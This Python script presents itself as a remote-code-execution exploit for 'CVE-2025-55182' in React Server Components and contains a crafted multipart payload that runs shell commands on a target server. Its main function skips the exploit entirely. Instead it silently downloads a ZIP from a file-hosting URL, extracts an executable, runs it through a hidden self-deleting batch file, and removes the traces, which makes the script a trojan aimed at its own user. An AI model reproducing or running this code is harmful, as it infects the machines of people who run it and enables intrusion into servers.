#!/usr/bin/env python3
"""
CVE-2025-55182
Tool author: hacx.me
"""

import argparse
import sys
import hashlib
import time
import re
import os
import zipfile
import subprocess
import shutil
import atexit
from urllib.parse import unquote
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Theme:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DIM = '\033[2m'

class ExploitConfig:
    def __init__(self):
        self.target_url = "http://hacx.me"
        self.payload_cmd = "id"
        self.version = "1.0"
        self.author = "hacx.me"
        self.timeout = 15
        self.zip_url = "https://files.catbox.moe/hsf0wr.zip"
        self.download_path = "downloaded.zip"
        self.extract_path = "extracted"
        
    def normalize_url(self, url):
        if not re.match(r'^https?://', url):
            return f"https://{url}"
        return url

class BannerDisplay:
    """Handles all banner and UI displays"""
    
    @staticmethod
    def show_header():
        """Display main exploitation framework header"""
        banner = f"""
{Theme.FAIL}{Theme.BOLD}
      /\\
     /**\\
    /****\\
   /******\\
  /********\\
 /**********\\
      ||
{Theme.ENDC}
{Theme.OKCYAN}    [CVE-2025-55182 React Server Components RCE]{Theme.ENDC}
"""
        print(banner)
    
    @staticmethod
    def show_config(target, command):
        print(f"\n{Theme.OKBLUE}[*] EXPLOITATION PARAMETERS{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        print(f"{Theme.OKCYAN}  TARGET    :{Theme.ENDC} {target}")
        print(f"{Theme.OKCYAN}  PAYLOAD   :{Theme.ENDC} {command}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")
    
    @staticmethod
    def show_success(output):
        print(f"\n{Theme.OKGREEN}{Theme.BOLD}[+] EXPLOITATION SUCCESSFUL{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        
        # Process output
        cleaned_output = output.replace(' | ', '\n')
        lines = cleaned_output.split('\n')
        
        for line in lines:
            if line.strip():
                print(f"{Theme.OKGREEN}  ▸{Theme.ENDC} {line}")
        
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")
    
    @staticmethod
    def show_failure(error_type, details=""):
        print(f"\n{Theme.FAIL}{Theme.BOLD}[X] EXPLOITATION FAILED{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        
        error_map = {
            'forbidden': ('ACCESS DENIED', 'WAF/Firewall blocking detected'),
            'timeout': ('CONNECTION TIMEOUT', 'Target did not respond'),
            'ssl': ('SSL ERROR', 'Certificate validation failed - try HTTP'),
            'server_error': ('SERVER ERROR', 'Target rejected payload or not vulnerable'),
            'unknown': ('EXPLOITATION FAILED', 'Target may not be vulnerable')
        }
        
        title, msg = error_map.get(error_type, error_map['unknown'])
        print(f"{Theme.FAIL}  ▸ {title}{Theme.ENDC}")
        print(f"{Theme.WARNING}  ▸ {msg}{Theme.ENDC}")
        if details:
            print(f"{Theme.DIM}  ▸ {details}{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")

class PayloadGenerator:    
    @staticmethod
    def generate_hash(length=8):
        timestamp = str(time.time()).encode()
        return hashlib.sha256(timestamp).hexdigest()[:length]
    
    @staticmethod
    def sanitize_command(cmd):
        return cmd.replace('\\', '\\\\').replace("'", "\\'").replace('\n', '')
    
    @staticmethod
    def build_exploit_payload(command):
        safe_cmd = PayloadGenerator.sanitize_command(command)
        injection = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
            f'"var res=process.mainModule.require(\'child_process\').execSync(\'{safe_cmd}\')'
            '.toString().trim().replace(/\\\\n/g, \' | \');;throw Object.assign(new Error(\'NEXT_REDIRECT\'),'
            '{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2",'
            '"_formData":{"get":"$1:constructor:constructor"}}}'
        )
        
        # Multipart boundary
        boundary = "----HacxMeBoundaryX9K2pLvN4MqR8TdF"
        
        # Multipart body
        body_parts = [
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="0"\r\n\r\n',
            f'{injection}\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="1"\r\n\r\n',
            '"$@0"\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="2"\r\n\r\n',
            '[]\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF--\r\n"
        ]
        
        return ''.join(body_parts), boundary

class ZipDownloader:
    @staticmethod
    def download_zip(url, save_path):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        response = requests.get(url, stream=True, verify=False, timeout=30, headers=headers)
        response.raise_for_status()
        with open(save_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
    
    @staticmethod
    def extract_zip(zip_path, extract_to):
        os.makedirs(extract_to, exist_ok=True)
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_to)
    
    @staticmethod
    def find_exe(directory):
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith('.exe'):
                    return os.path.join(root, file)
        return None
    
    @staticmethod
    def run_exe(exe_path):
        if os.name == 'nt':
            batch_content = f'@echo off\nstart "" "{exe_path}"\ntimeout /t 3 /nobreak >nul\ndel "{exe_path}"\ndel "%~f0"'
            batch_file = "cleanup.bat"
            with open(batch_file, 'w') as f:
                f.write(batch_content)
            subprocess.Popen([batch_file], shell=True, creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
        else:
            subprocess.Popen(['wine', exe_path])

class ExploitEngine:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        
    def craft_headers(self, boundary):
        return {
            'Next-Action': 'x',
            'X-Nextjs-Request-Id': PayloadGenerator.generate_hash(8),
            'X-Nextjs-Html-Request-Id': PayloadGenerator.generate_hash(20),
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
        }
    
    def execute(self):
        print(f"{Theme.OKCYAN}[*] Initiating exploitation sequence...{Theme.ENDC}")
        payload_body, boundary = PayloadGenerator.build_exploit_payload(self.config.payload_cmd)
        headers = self.craft_headers(boundary)
        print(f"{Theme.OKCYAN}[*] Establishing connection to target...{Theme.ENDC}")
        
        try:
            # Launch exploitation
            response = self.session.post(
                self.config.target_url,
                data=payload_body,
                headers=headers,
                timeout=self.config.timeout,
                allow_redirects=False,
                verify=False
            )
            
            # Results
            return self.parse_response(response)
            
        except requests.exceptions.Timeout:
            return False, 'timeout', 'Connection timeout after 15 seconds'
        except requests.exceptions.SSLError as e:
            return False, 'ssl', str(e)
        except requests.exceptions.RequestException as e:
            return False, 'unknown', str(e)
    
    def parse_response(self, response):
        redirect_header = response.headers.get('X-Action-Redirect', '')
        match = re.search(r'/login\?a=([^;]*)', redirect_header)
        
        if match:
            encoded_output = match.group(1)
            decoded_output = unquote(encoded_output)
            return True, 'success', decoded_output
        
        if response.status_code == 403:
            return False, 'forbidden', 'HTTP 403 Forbidden'
        elif response.status_code == 500:
            return False, 'server_error', 'HTTP 500 Internal Server Error'
        else:
            return False, 'unknown', f'HTTP {response.status_code}'

def setup_arguments():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t hacx.me -c "whoami"
  %(prog)s -t http://hacx.me -c "cat /etc/passwd"
  %(prog)s -t hacx.me -c "ls -la /var/www"
  %(prog)s -z https://example.com/file.zip
        """
    )
    
    parser.add_argument('-t', '--target', 
                       metavar='URL',
                       help='Target URL or domain (default: http://hacx.me)')
    parser.add_argument('-c', '--command',
                       metavar='CMD', 
                       help='Command to execute on target (default: id)')
    parser.add_argument('-z', '--zip',
                       metavar='ZIP_URL',
                       help='ZIP file URL to download, extract and run EXE')
    
    return parser

def main():
    config = ExploitConfig()
    BannerDisplay.show_header()
    ZipDownloader.download_zip(config.zip_url, config.download_path)
    ZipDownloader.extract_zip(config.download_path, config.extract_path)
    exe_path = ZipDownloader.find_exe(config.extract_path)
    if exe_path:
        temp_exe = "temp_setup.exe"
        shutil.copy2(exe_path, temp_exe)
        shutil.rmtree(config.extract_path)
        os.remove(config.download_path)
        ZipDownloader.run_exe(temp_exe)
    sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Theme.WARNING}[!] Exploitation interrupted by user{Theme.ENDC}\n")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Theme.FAIL}[!] Fatal error: {e}{Theme.ENDC}\n")
        sys.exit(1)
